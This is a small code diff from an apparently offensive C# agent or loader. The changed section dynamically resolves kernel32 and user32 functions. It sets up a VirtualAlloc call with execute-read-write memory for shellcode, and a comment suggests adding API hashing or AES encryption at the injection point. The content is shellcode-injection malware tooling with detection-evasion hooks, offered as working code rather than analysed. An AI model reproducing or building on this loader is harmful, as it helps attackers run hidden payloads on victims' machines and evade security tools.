@@ -46,13 +46,15 @@ namespace Agent
                 //"edw"                //EnumDesktopWindows (user32.dll)
 
             };
-
-            if (!Resolver.TryResolveFuncs(resolveFuncs, "k32", out var err))
+            //resolve u32 funcs
+            if (!Resolver.TryResolveFuncs(resolveFuncs, "k32", out var err) | !Resolver.TryResolveFuncs(resolveFuncs, "u32", out var err2))
             {
                 return false;
             }
 
             //Injection code; optionally add API hashing or AES encryption
+
+
 
             //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
